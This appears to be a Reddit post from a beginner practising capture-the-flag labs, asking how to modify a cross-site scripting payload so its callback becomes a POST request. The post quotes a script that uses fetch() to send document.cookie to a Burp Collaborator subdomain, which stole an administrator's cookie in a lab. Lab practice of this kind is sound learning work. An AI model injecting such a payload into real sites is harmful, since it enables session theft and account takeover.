@@ -1,0 +1,13 @@
+POST ID: 13lte6c / POST TITLE: Capture the flag
+====================================================================================================
+ 
+
+Dear Redditors,  
+Iam kind of new to ethical hacking so i am practicing capture the flags. I have several labs that are followups from eachother. The first lab was done by stealing the cookie from the administrator with this script:
+
+<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
+
+this script gave me a POST request to the burp collaborator with the flag in it. The next lab is working the same, but now i get a GET request with GET /' as request to my Collaborator. How can i modify the script, so the request to the collaborator will be a POST request aswell?
+
+POST COMMENTS:
+====================================================================================================
